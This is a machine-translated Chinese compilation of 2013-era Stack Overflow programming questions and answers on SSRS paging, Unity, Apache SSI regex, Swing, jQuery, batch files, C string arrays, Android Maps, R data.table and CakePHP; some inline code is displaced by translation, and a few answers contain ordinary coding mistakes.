我有一个包含两个行组的报告：名称和类别。我想要做的是让报告在 25 个名字之后开始一个新页面。我已经尝试过 RowNumber 方法，但是在多行组情况下似乎效果不佳，因为它似乎在每个名称之后分页并且它丢失了类别分组。我可以做些什么来获得我想要的寻呼吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:16:14.713

我相信你会希望它通过表达式作为一个组使用，尽管我自己没有使用它，所以我会先测试它。

```
=Ceiling(RowNumber(Nothing)/25) 
```

那将是您的分组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-01T15:56:15.743

这个案例很简单

去属性

并找到

报告

页面--->InteractiveSize--->高度

将高度属性更改为 5.5，您将能够每页显示 20 行

你可以玩高度，直到每页有 25 行

# dependency-injection - 在 Unity 中注册

> ID：16091813
> 
> 赞同：2
> 
> 时间：2013-04-18T19:48:43.663
> 
> 标签：dependency-injection, unity-container, ioc-container, auto-registration

我习惯于使用 Autofac 和 autofac 一行代码，我可以在程序集中注册所有接口，以便它们解析为实现该接口的任何类。

在 Unity 中，我似乎需要手动注册每个接口。我想知道是否有一种更简单的方法来全局注册所有内容，然后针对生命周期差异创建单独的条目。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T21:35:52.593

Unity 2 中没有。

然而，有一些 contrib 项目试图在 Unity 之上添加此行为，例如：

*   [Unity 自动注册](http://autoregistration.codeplex.com/)
*   [Unity Contrib 项目](https://unitycontributions.codeplex.com/)
*   [泰克X](https://tecx.codeplex.com/)

**更新**

[Unity 3](https://unity.codeplex.com/wikipage?title=Unity3ReleaseNotes)似乎刚刚发布，其中包含对批量注册的支持。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-30T21:26:15.483

Unity 3 现在支持自动注册。

# regex - httpd 2.4 中的 Apache 正则表达式反向引用 UNREACHABLE？

> ID：16091816
> 
> 赞同：8
> 
> 时间：2013-04-18T19:48:59.460
> 
> 标签：regex, apache, ssi, server-side-includes, mod-include

我喜欢新的**apache httpd 2.4**有很多很酷的新东西！

[ap_expr](http://httpd.apache.org/docs/2.4/expr.html "ap_expr")是这些非常有前途的新功能之一，

..但以下 SSI 片段无法按预期工作：

```
{{if expr="v('HTTP_SESSION') =~ /-user=([^&]+)/"}} 
{{set var="user" value="$1"}} 
{{endif}} 
```

**if**工作但 var 未设置！这没有任何意义。

error.log 说：

```
.. AH01330: regex capture $1 is out of range 
```

该文档（[http://httpd.apache.org/docs/2.4/expr.html#other](http://httpd.apache.org/docs/2.4/expr.html#other)）令人困惑，附近**没有任何示例**。

*我知道 SSI 有一个旧版（解决方法）开关。但我不想使用它，因为旧的开始标签和结束标签是强制的* [Legacy](http://httpd.apache.org/docs/current/mod/mod_include.html#ssilegacyexprparser%20legacy)

使用 SetEnvIfExpr 做类似的正则表达式解析技巧也无济于事

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-20T07:57:27.710

通过改变

```
{{if expr="v('HTTP_SESSION') =~ /-user=([^&]+)/"}} 
    {{set var="user" value="$1"}} 
{{endif}} 
```

至

```
{{if expr="v('HTTP_SESSION') =~ /-user=([^&]+)/"}} 
    {{set var="user" value="$0"}}
    {{if expr="v('user') =~ /([^&]+)$/"}}
         {{set var="user" value="$0"}}
    {{endif}}
{{endif}} 
```

可以使用 $0 似乎有效这一事实来解决该问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-08T19:45:54.140

根据[文档](http://httpd.apache.org/docs/2.4/expr.html)：

> 正则表达式反向引用字符串 $0 ... $9 允许从先前执行的、成功匹配的正则表达式中引用捕获组。它们通常只能在与匹配的正则表达式相同的表达式中使用，但某些模块允许特殊用途。

您正在使用捕获组，并且您正在使用 index 引用它，使用`1`标准正则表达式引擎应该没问题，但根据您可以参考的文档`$0...$9`。`0`我猜 apache 正在用你的捕获组填充 inde ，而不是`1`你得到了`regex capture $1 is out of range`

使用以下方法将索引更改`$1`为`$0`：

```
{{if expr="v('HTTP_SESSION') =~ /-user=([^&]+)/"}} 
{{set var="user" value="$0"}} 
{{endif}} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-30T13:02:43.727

```
{{if expr="v('HTTP_SESSION') =~ /-user=([^&]+)/ && $1 =~ /(.+)/"}} 
    {{set var="user" value="$0"}} 
{{endif}} 
```

# java - Java，JPanel 未在 JFrame 中显示，可能存在并发问题？

> ID：16091820
> 
> 赞同：1
> 
> 时间：2013-04-18T19:49:02.673
> 
> 标签：java, swing, animation, java-2d, event-dispatch-thread

我有一个 4 帧向量，它由一个 JButtons 的二维数组组成，该数组包含在一个 JPanel 中。我正在尝试将这些添加到 JFrame 中，以便它们在循环时显示动画。

我有一个 add 方法，当我手动增加它时可以工作，但是当我把它放在 for 循环中时，框架保持空白，就好像它没有被重新绘制一样。终端打印正确的索引号。

```
public void addNewFrame() throws InterruptedException {
    for (int i = 0; i < 10; i++) {
        if (index == 3) {
            System.out.println(index);
            remove(model.getFrame(3));
            revalidate();
            repaint();
            index = 0;
            add(model.getFrame(index), BorderLayout.CENTER);
            revalidate();
            repaint();
            Thread.sleep(300);
        } else {
            System.out.println(index);
            remove(model.getFrame(index));
            revalidate();
            repaint();
            index++;
            add(model.getFrame(index), BorderLayout.CENTER);
            revalidate();
            repaint();
            Thread.sleep(300);
        }
    } 
```

这可能是并发问题吗？我应该将二维按钮数组添加到在它自己的线程中运行的 JPanel 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:53:16.337

> 循环播放时它们会显示动画。

不要使用 Thread.sleep() 来尝试控制动画。

动画应该使用[Swing Timer](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)来完成。

此外，每当我看到删除/添加组件的代码时，它几乎总是错误的。相反，您应该使用`CardLayout`. 上面的教程还有一个关于如何使用 CardLayout 的部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:59:15.480

您在 if 语句中执行相同的操作，这将使更新该操作变得相当困难。如果这确实是您想要的功能，则需要将其更改为：

```
for (int i = 0; i < 10; i++) {
    boolean resetIndex = false;
    remove(model.getFrame(index));
    if (index == 3) {
        index = 0;
        resetIndex = true;
    }
    System.out.println(index);
    remove(model.getFrame(index));
    revalidate();
    repaint();
    if (!resetIndex && index != 3)
        index++;
    add(model.getFrame(index), BorderLayout.CENTER);
    revalidate();
    repaint();
    Thread.sleep(300);
} 
```

您还应该寻找替换您的`revalidate`and`repaint`调用`updateUI`，它将正确处理`repaint`所有孩子的调用，而不是仅将电流引导`JComponent`到自己绘制。

# jquery - 在事件中使用 jQuery 获取被点击的元素？

> ID：16091823
> 
> 赞同：103
> 
> 时间：2013-04-18T19:49:08.587
> 
> 标签：jquery, event-handling, click, jquery-events

我正在使用以下代码来检测何时单击动态生成的按钮。

```
$(document).on("click",".appDetails", function () {
    alert("test");
}); 
```

通常，如果您刚刚这样做，`$('.appDetails').click()`您可以使用`$(this)`来获取被点击的元素。我将如何使用上面的代码完成此操作？

例如：

```
$(document).on("click",".appDetails", function () {
    var clickedBtnID = ??????
    alert('you clicked on button #' + clickedBtnID);
}); 
```

* * *

## 回答 #1

> 赞同：133
> 
> 时间：2013-04-18T19:50:36.983

尽可能简单

也用`$(this)`在这里

```
$(document).on("click",".appDetails", function () {
   var clickedBtnID = $(this).attr('id'); // or var clickedBtnID = this.id
   alert('you clicked on button #' + clickedBtnID);
}); 
```

* * *

## 回答 #2

> 赞同：60
> 
> 时间：2013-04-18T19:53:45.777

您缺少函数上的事件参数。

```
$(document).on("click",".appDetails", function (event) {
    alert(event.target.id);
}); 
```

* * *

## 回答 #3

> 赞同：43
> 
> 时间：2017-10-25T05:58:36.927

传统的处理方式在 ES6 中表现不佳。你可以这样做：

```
$('.delete').on('click', event => {
  const clickedElement = $(event.target);

  this.delete(clickedElement.data('id'));
}); 
```

请注意，事件目标将是单击的元素，它可能不是您想要的元素（它可能是接收事件的子元素）。要获取实际元素：

```
$('.delete').on('click', event => {
  const clickedElement = $(event.target);
  const targetElement = clickedElement.closest('.delete');

  this.delete(targetElement.data('id'));
}); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-07-14T12:31:24.390

有很多方法可以做到这一点

> > 第一种方法是使用 javascript 目标

```
$(document).on("click",".appDetails", function (event) {
    var clickebtn = target.event.id;
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-05-09T19:49:23.697

一种简单的方法是将数据属性传递给您的 HTML 标记。

例子：

```
<div data-id='tagid' class="clickElem"></div>

<script>
$(document).on("click",".appDetails", function () {
   var clickedBtnID = $(this).attr('data');
   alert('you clicked on button #' + clickedBtnID);
});
</script> 
```

# batch-file - 插入到 cmd 命令的重定向输出中的空格/空值

> ID：16091826
> 
> 赞同：4
> 
> 时间：2013-04-18T19:49:32.253
> 
> 标签：batch-file, null, output, spaces

当我运行命令时

```
wmic memorychip get capacity 
```

从 cmd 窗口中的命令行，屏幕上的输出如下所示：

```
Capacity    
2147483648 
```

但是，如果我将此命令添加到批处理文件并尝试将输出重定向到文件，例如：

```
wmic memorychip get capacity >> %LOG% 
```

（其中 %LOG% 只是我要在其中附加数据的日志文件），它在日志文件中保存为：

```
C a p a c i t y         

 2 1 4 7 4 8 3 6 4 8 
```

这里在每个字符之前插入了空格。在记事本++中，它显示插入了 NUL，由于某种原因，我无法将其粘贴到此处:(

有谁知道为什么输出会以这种方式改变以及如何避免这种转变？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T06:22:39.933

肯定是Unicode。

尝试

```
wmic memorychip get capacity |more>> %LOG% 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-10-15T02:31:34.347

如果您有输出文件但无法再次运行原始命令，`cat original.txt | tr -d "\00" > cleaned.txt`将生成一个删除空字符的新文件。此命令假定通用 Unix shell 工具可用，例如[BusyBox](https://frippery.org/busybox/)提供的工具。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T20:31:22.287

问题是 wmic 在 unicode 中工作，但在 ascii 中的 cmd。试试这个：

```
for /f "delims=" %a in ('wmic memorychip get capacity') do @for /f "delims=" %b in ("%a") do echo %b > log 
```

# javascript - 为什么VS中的jsLint会生成：A' ' must be within '< body head noframes >?

> ID：16091836
> 
> 赞同：1
> 
> 时间：2013-04-18T19:50:12.020
> 
> 标签：javascript, visual-studio, jslint

The basic structure of my page is

```
 body
       div id="content"
          nav
          article id="spa"
             noscript 
```

I searched the [docs page](http://www.jslint.com/lint.html) for noscript but found nothing. I'm not even sure what the error message is suggesting I should do since the noscript tag is already inside a body tag. The page displays and works properly. When js support is turned off the appropriate message is displayed. I tried moving the noscript tag to just below the body tag but the same warning is issued.

As part of posting this message I took the contents of my html page, including the open and close body tags, pasted it into jsFiddle and it came up clean. This may be specific to Visual Studio 2012 and the JSLint.VS2012 extension. I also didn't see a way in the JsLint options to disable this check.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T02:27:01.067

That warning does indeed come from JSLint, although not the latest version – warnings for HTML and CSS code were removed from JSLint [quite recently](https://github.com/douglascrockford/JSLint/commit/267939b9168419312782a8533e35c60243215d56).

I'm not sure why JSLint insists a `<noscript>` tag can only go in those places. The [HTML 5 spec says](http://www.w3.org/html/wg/drafts/html/master/scripting-1.html#the-noscript-element) it can go anywhere "phrasing content" is allowed, which is basically all the main content.

JSLint is very *very* picky. So while it's possible the warning exists because some legacy browsers have trouble with `<noscript>` in other locations... it's equally likely it's just a personal pet peeve of JSLint's creator, Douglas Crockford.

If you want to eliminate all JSLint warnings and you can't move the `<noscript>` tag up to the body, you could always use a regular visible element that's hidden by JS code if the JS gets a chance to run. Like this: [http://jsfiddle.net/jJNDa/](http://jsfiddle.net/jJNDa/)

# php - 密码保护网站

> ID：16091838
> 
> 赞同：0
> 
> 时间：2013-04-18T19:50:12.613
> 
> 标签：php, javascript

我将如何使用密码保护我的网站？我一直在胡思乱想，到目前为止，我的网站陷入了与此类似的问题：

```
<script>   
function password() {
var password = prompt("Enter password:");
if (password.toString().toLowerCase() == "pass") {
    location.href = "siteURL";
    return true;
}
else {   
    alert ("Incorrect code");
    return false;
}
}
</script> 
```

然而，这并不难解决。

我一直在寻找一些东西，即使进入主站点，它们也会被重定向到密码页面。如果他们输入正确，他们可以返回当前页面，否则他们将无法进入。我已经对“密码页面”进行了排序。我只是想知道是否有办法重定向到那里并返回。另外，这样的事情是否需要cookies来查看用户是否已经正确输入了密码？

如果有人可以指导我获得有关这方面的有用信息，将不胜感激。

我在标签中添加了 PHP 和 Javascript，因为我不确定这是否是服务器端脚本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:55:13.713

使用 PHP 可以使用 session_start() 并检查用户是否已通过登录页面进行身份验证。网上有很多教程。

[http://www.phpeasystep.com/phptu/6.html](http://www.phpeasystep.com/phptu/6.html)

# php - 在 PHP 中查找因子的代码不适用于负数

> ID：16091839
> 
> 赞同：1
> 
> 时间：2013-04-18T19:50:17.823
> 
> 标签：php

例如，下面的代码适用于 factor(6)。但是，对于 factor(-8)，代码返回一个空白页。我尝试了很多，但我无法找出问题所在

```
 function factor($n){
        for ($x = 1; $x <= sqrt($n); $x++)
        {
            if ($n % $x == 0)
            {
            $z = $n/$x; 
            echo "$x and $z"."<br><br>";    
            }
        }
     } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T21:18:13.440

你想避免虚数——尤其是在循环中。似乎PHP不能很好地处理。

使 $n 为正，该函数将起作用：

```
function factor($n){
    for ($x = 1; $x <= sqrt(abs($n)); $x++)
    {
        if ($n % $x == 0)
        {
            $z = $n/$x; 
            echo "$x and $z"."<br><br>";    
        }
    }
 } 
```

# javascript - 我收到此消息“对象 [对象对象] 没有方法 'on'

> ID：16091841
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:50:21.953
> 
> 标签：javascript, jquery, javascript-events

我收到这条消息：

> “对象[对象对象]没有方法'on'”

到代码

```
$(window).on('resize', function () {
    self.setDimensions();
}); 
```

我能做些什么？我已经有 jQuery 1.9...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:58:17.773

确保您至少使用 jQuery 版本 1.7

在 1.7 之前，您可以替换`.on()`为`.bind()`（如果您不使用事件委托）。

最好的可能是您升级到最新的 jQuery 版本 - 1.9 ATM。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:11:39.627

如果您已经包含了最新版本的 jQuery，但它仍然显示没有`on`，那么这意味着[其他一些库正在覆盖`$`](http://jsfiddle.net/DerekL/bP3Cb/). 要解决此问题，请尝试以下操作：

```
$.noConflict();
jQuery(document).ready(function($) {
    // Use $ here
    var self = mysterious();
    $(window).on("resize", function(){
        self.setDimensions();
    })
}); 
```

[http://jsfiddle.net/DerekL/SUBGD/](http://jsfiddle.net/DerekL/SUBGD/)

# c - 在 C 中制作一个数组来保存字符数组的数组

> ID：16091848
> 
> 赞同：14
> 
> 时间：2013-04-18T19:50:49.247
> 
> 标签：c, arrays, character-arrays

我的 C 目前有点生锈，所以我没能创造出我认为应该很基本的东西。

请允许我在这篇文章中将字符数组称为字符串。它会让我和你都更清楚。

我所拥有的是一个可以容纳 1 个或多个字符串的数组。例如 {"ab", "cd", "ef"}。我想制作另一个数组来存储字符串数组的多个版本。所以像 {{"ab", "cd", "ef"}, {"gh", "ij"}, {"kl"}}。

我现在拥有的是：

```
char *arrayOfStrings[50]; // a single array to hold multiple strings
char **arrayOfArraysOfStrings[10]; // array to hold multiple snapshots of arrayOfStrings 
```

字符串数组随时间变化，我使用字符串数组基本上保存arrayOfStrings 的历史快照。当我需要访问快照数组以获取数据时，我的问题就出现了。这是我必须将东西放入快照数组的代码：

```
arrayOfArraysOfStrings[input_index] = arrayOfStrings; // you can assume input_index is updated correctly, I've already checked that. 
```

这似乎是不正确的，因为当我尝试访问并打印出快照数组的内容时，它只打印出最新 arrayOfStrings 中的信息。我的想法是将 arrayOfChars 指向的地址存储在快照数组的条目中，以便以后可以访问它。

现在，对快照数组中的条目的访问是这样完成的：

```
arrayOfArraysOfChars[historicalIndex][indexOfTargetChar] 
```

我想回答几个问题：

1.  我概述的方法是否适合我正在尝试做的事情，或者我的整体逻辑是否存在缺陷？
2.  我当前的代码做错了什么，我该如何解决？
3.  有没有更好的方法来做到这一点，如果是这样，数组的初始化、添加到数组以及从数组中读取是如何工作的？

--edit 4/18-- 部分问题是我在 arrayOfArraysOfStrings 中设置指针以指向与 arrayOfStrings 指向的相同的东西。这很糟糕，因为 arrayOfStrings 被编辑了。我需要一些方法来复制一个二维数组......最好是简单地为 arrayOfStrings 分配一个新的内存块来指向。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-18T20:09:10.300

您的两个数组中都有一个太多的指针。

```
char arrayOfChars[50]; // a single array of characters
char *arrayOfArraysOfChars[10]; // array to hold multiple single arrays of characters 
```

由于 arrayOfChars 被用作缓冲区（新数据总是先到那里），因此您需要将字符串的副本保存到 arrayOfArrays 中。POSIX 函数`strdup`在这里应该有所帮助。

注意`&`和`*`是对立的，所以绝对什么也不做`&*`。`*&`

您也可以按字面意思制作 arrayOfArrays。

```
char arrayOfChars[50]; // a single array of characters
char arrayOfArraysOfChars[10][50]; // array to hold multiple single arrays of characters 
```

使用此设置，您应该使用`strcpy`将数据复制到 arrayOfArrays。

* * *

阅读您的编辑后，我认为您需要从*非常*简单的开始。FWIW 变量名是错误的匈牙利语。

对于我认为您正在尝试做的事情，我将从一个 char 数组开始。这将是主*缓冲区*，用于保存正在输入和检查的字符串。

```
enum { BUFSZ = 50 };
char buf[BUFSZ + 1]; 
```

然后你可以使用它`fgets`或其他任何东西。

```
fgets(buf, BUFSZ, infile); 
```

要将它们保存在一个数组中，我会使用`strdup`它的自动修剪。如果字符串的长度主要为 2 个字符，我不希望每个字符使用 48 个额外字节。因此，一个 char 指针（字符串）数组。

```
enum { STRVSZ = 40 };
char *strv[STRVSZ + 1];
int i;
i = 0;
strv[i] = strdup(buf);
strv[i+1] = NULL; // This makes it an "argv-style" NULL-terminated array of strings
++i; // i is now the index of the next element, and a count of elements already added 
```

的每个元素`strv`都是一个字符指针。但为了保持理智，我们暂时尝试*抽象*出一些令人分心的细节，并将*字符串*视为单独的数据类型。

现在要创建这些列表，我们再次做同样的事情。但是没有`strdup`-type 函数可以复制指针数组，因此我们必须将分配和复制分开。

```
enum { STRVVSZ = 20 };
char **strvv[STRVVSZ + 1];
int j;
j = 0;
strvv[j] = calloc(i+1, sizeof *strvv[j]); // assuming i is the count of elements 
memcpy(strvv[j], strv, i * sizeof *strvv[j]);
++j; // j is now the index of the next string-pointer array in the array-of-same,
     // and a count of elements already added. 
```

现在，我的名字和你的一样傻，但是它们*更短了！*

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-18T20:25:51.707

您应该了解数组的含义。数组基本上是一组*整数*或*字符*或*任何东西*。当您将字符值存储在数组中时，将其定义为，

```
char array[] = {"somestringhere"}; 
```

现在您想将此类数组存储在另一个数组中。很简单：

```
char* array1[]; 
```

array1 将存储`char*`类型的值，即字符数组的地址。现在你想将这些存储在其他数组中，

```
char** array2[]; 
```

这就是 [address of arrays] 现在的数组，您所要做的就是；

```
array1[0] = array; //same as: array1[0] = *array[0];
array2[0] = *array1[0]; 
```

现在您拥有所需的一切。希望你清楚，核心。:)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-10-06T20:23:34.637

这个例子是用 turbo c+ 1.01 dos 完成的，也适用于 3.0 dos 版本。

```
char * text[] = {
  "message1",
  "message2",
  "message3"
}; 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-18T20:28:55.363

请注意，您的示例显示了指针数组。如果您想要数组的数组（多维数组），请在数组定义中指定所有大小。

```
char sentences[500][42]; /* sentences is an array of 500 elements.
                         ** each element is itself an array
                         ** capable of holding strings up to length 41 */ 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-09-16T02:15:24.807

如果将文本存储在具有多行文本的 .c 或 .h 文件中，则相当于 char 数组数组的想法。可以这样做：

```
char * text[] = {
  "message1",
  "message2",
  "message3"
}; 
```

还可以使用 char *text[]、char near *text[]、char far *text[]、char huge *text[]。指针必须有星号或星号。

for 循环可用于显示文本：

```
char i; // int type can also be used
for (i = 0, i < 3; i++)
  printf("%s\n", text[i]); 
```

其他循环：

```
char i = 0;  // may not be zero when declared as "char i;" only
while (i < 3) {
  printf("%s\n", text[i]);
  i++;
 } 
```

或者

```
char i = 0;  // may not be zero when declared as "char i;" only
do {
 printf("%s\n", text[i]);
 i++;
} while (i < 3); 
```

# android - 错误：无法找到 com.google.settings 的提供商信息

> ID：16091851
> 
> 赞同：1
> 
> 时间：2013-04-18T19:51:10.203
> 
> 标签：android, eclipse, find

我在Android应用程序上有这个问题。这是项目的代码

***显现***

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.mapbcb"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />

    <permission
            android:name="com.example.mapdemo.permission.MAPS_RECEIVE"
            android:protectionLevel="signature"/>
    <uses-permission android:name="com.example.mapbcb.permission.MAPS_RECEIVE"/>

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/>

    <!-- The following two permissions are not required to use
         Google Maps Android API v2, but are recommended. -->
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>

    <uses-feature
            android:glEsVersion="0x00020000"
            android:required="true"/>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name="com.example.mapbcb.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <meta-data
                android:name="com.google.android.maps.v2.API_KEY"
                android:value="API_KEY"/>
    </application>

</manifest> 
```

***主.xml***

```
 <?xml version="1.0" encoding="utf-8"?>
    <fragment xmlns:android="http://schemas.android.com/apk/res/android"
              android:id="@+id/map"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:name="com.google.android.gms.maps.MapFragment"/> 
```

***爪哇***

```
package com.example.mapbcb;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

} 
```

编译后，显示错误：

```
Failed to find provider info for com.google.settings 
```

API_KEY 是在我的计算机中生成的并且是正确的。

请帮帮我！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:54:22.290

您正在编写应用程序，`minSDK 8`但您使用的`MapFragment`对象仅受`SDK 11`.

你应该做的是使用`SupportMapFragment`object 和 a `FragmentAcitivity`。

您的代码中的另一个问题是您的权限：

```
 <permission
        android:name="com.example.mapdemo.permission.MAPS_RECEIVE"
        android:protectionLevel="signature"/>
<uses-permission android:name="com.example.mapbcb.permission.MAPS_RECEIVE"/> 
```

应该包含您的项目包：`com.example.mapbcb`而不是：`com.example.mapdemo`

看看我写的关于如何使用该`google-support-v4`库集成 Google Maps API V2 以支持旧版本的 Android 平台的博客：

[谷歌地图 API v2](http://blog-emildesign.rhcloud.com/?p=435)

# asp.net-mvc-3 - JQueryUI 滑块而不是数字输入类型

> ID：16091855
> 
> 赞同：2
> 
> 时间：2013-04-18T19:51:31.003
> 
> 标签：asp.net-mvc-3, jquery-ui

我在 MVC3 中有一个简单的视图，有三个类型的数字输入。我需要做的是显示一个 JQueryUI 滑块而不是输入。我试过这样，但它只会改变输入表单的形状并且没有滑块。

代码：

```
<script>
        $(function () {
            $(".nmbr").slider({
                range: "min",
                min: 1,
                max: 100,
                slide: function (event, ui) {
                    $("input[name=" + $(this).attr("id") + "_value]").val(ui.value);
                }
            });
        });
</script> 
```

和html：

```
<div>
<label for="number">Value:</label>
<input type="text" name="first_value" style="border:0;" />
<input type="number" class="nmbr" id="first" />
<br />
<br />

<label for="number">Value:</label>
<input type="text" name="second_value" style="border:0;" />
<input type="number" class="nmbr" id="second" />
<br />
<br />

<label for="number">Value:</label>
<input type="text" name="third_value" style="border:0;" />
<input type="number" class="nmbr" id="third" />
<br />
<br /> 
```

我在哪里偏离了道路？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:14:07.640

[`jQuery UI's Slider`](http://jqueryui.com/slider/)`div`不使用`input` *（容易犯错误）*。

进行以下更改：

JAVASCRIPT：

```
$(function () {
    $(".nmbr").slider({
        range: "min",
        min: 1,
        max: 100,
        slide: function (event, ui) {
            $("input[name=" + $(this).attr("id") + "_value]").val(ui.value);
        }
    });
}); 
```

HTML：

```
<label for="number">Value:</label>
<input type="text" name="first_value" style="border:0;" />
<div class="nmbr" id="first"></div>
<br />
<br />

<label for="number">Value:</label>
<input type="text" name="second_value" style="border:0;" />
<div class="nmbr" class="nmbr" id="second"></div>
<br />
<br />

<label for="number">Value:</label>
<input type="text" name="third_value" style="border:0;" />
<div class="nmbr" class="nmbr" id="third"></div>
<br />
<br /> 
```

演示：http: [//jsfiddle.net/dirtyd77/qN59g/5/](http://jsfiddle.net/dirtyd77/qN59g/5/)

# r - 统计data.table的列长，列名由第二个data.table提供

> ID：16091857
> 
> 赞同：1
> 
> 时间：2013-04-18T19:51:33.970
> 
> 标签：r, nested, data.table

我有一个 data.table，比如说 test.dt，有一个名为“id”的列。列“id”的行指的是第二个 data.table 的列标题，比如 counts.dt。我想提供每列的长度以与原始 test.dt 中的相应行 ID 相匹配。例如：

```
test <- function() {
    library(data.table)
    test.dt <- data.table(id=c("a","b","c"),other=1:3)
    counts.dt <- data.table(a=c(1,NA,NA,NA),b=c(1,1,NA,NA),c=c(1,1,1,1),d=1:4,e=1:4)

    print(counts.dt)
    test.dt<-test.dt[,count:=sum(!is.na(counts.dt[,id]))]
    print(test.dt)
} 
```

哪个返回：counts.dt 符合预期：

```
 a  b c d e
1:  1  1 1 1 1
2: NA  1 1 2 2
3: NA NA 1 3 3
4: NA NA 1 4 4 
```

但是，test.dt 似乎不是计算 counts.dt 列中非 NA 元素的数量，而是 test.dt 的长度导致：

```
 id other count
1:  a     1     3
2:  b     2     3
3:  c     3     3 
```

我想要的是这样的表格：

```
 id other count
1:  a     1     1
2:  b     2     2
3:  c     3     4 
```

想法？

我尝试使用具有相同结果的不同 eval 函数使我的“sum”语句更复杂。我无法找到这个特定问题的答案；任何帮助或重定向到类似问题将不胜感激。

***更新***：我的实际数据有更长的文本字符串作为 ID，使用所示答案导致以下错误：

```
Error in Math.factor(j) : abs not meaningful for factors 
```

但是，我能够通过以下方式使事情进展：

```
get.length<-function(x){return(as.character(x))}
test.dt<-test.dt[,count:= sum(!is.na(counts.dt[,get.length(id),with=FALSE]),na.rm=TRUE),by=id] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:21:26.120

尝试这个：

```
test.dt[, count := sum(counts.dt[, id, with = F], na.rm = T), by = id] 
```

最终，`data.table`可能会删除该`with=FALSE`选项，在这种情况下，马特的建议仍然有效：`counts.dt[[id]]`

# javascript - 将关联数组声明为 new Array() 是否与将关联数组声明为对象 {} 相同？

> ID：16091858
> 
> 赞同：1
> 
> 时间：2013-04-18T19:51:39.187
> 
> 标签：javascript, arrays

在这两种情况下，对象是否`whiteStripes`完全相同？

```
var whiteStripes = {'Jack' : 'White', 'Meg' : 'White'};

var whiteStripes = new Array();
whiteStripes['Jack'] = 'White';
whiteStripes['Meg'] = 'White'; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:55:30.273

虽然当您声明它具有数组的所有属性和属性时，您仍然可以`whiteStripes['Jack']`在两种情况下以相同的方式 ( )访问属性，例如。如果您不打算将其用作真正的数组（、、等），则不要使用 JavaScript 数组。`whiteStripes = new Array();``length``pop``push``length`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T19:56:51.210

不，这不完全一样。

两者都可以，因为数组*也是*一个对象，但如果你只想要一个对象，你不应该创建一个数组来获取一个。

这些将导致创建完全相同的东西：

```
var whiteStripes = {'Jack' : 'White', 'Meg' : 'White'};

var whiteStripes = new Object();
whiteStripes['Jack'] = 'White';
whiteStripes['Meg'] = 'White'; 
```

# cakephp - Cakephp 2.3：当外键与模型列不匹配时建立模型关联

> ID：16091861
> 
> 赞同：0
> 
> 时间：2013-04-18T19:51:57.643
> 
> 标签：cakephp, foreign-keys, cakephp-2.0, model-associations

一般来说，我如何在一个表中创建外键（即列），Cakephp 通过不同的名称将其与另一个模型的列关联？顺便说一句，我正在使用`bake all`标准 CRUD 设置开始。

我的问题的一般形式是：

`Table_A`有`id`| `label`| `TableB_labelA_id`|`TableB_labelB_id`

`Table_B`有`id`|`label`

不过，为了让问题的其余部分不那么难看，这是我当前的应用程序：

`games`有`id`| `date`| `us`|`them`

`teams`有`id`|`name`

我认为这可以通过别名和关联定义单独实现，但我不太明白如何。我也想到简单地创建`Us`和`Them`扩展的模型`Team`，但这似乎是一种过度的努力。

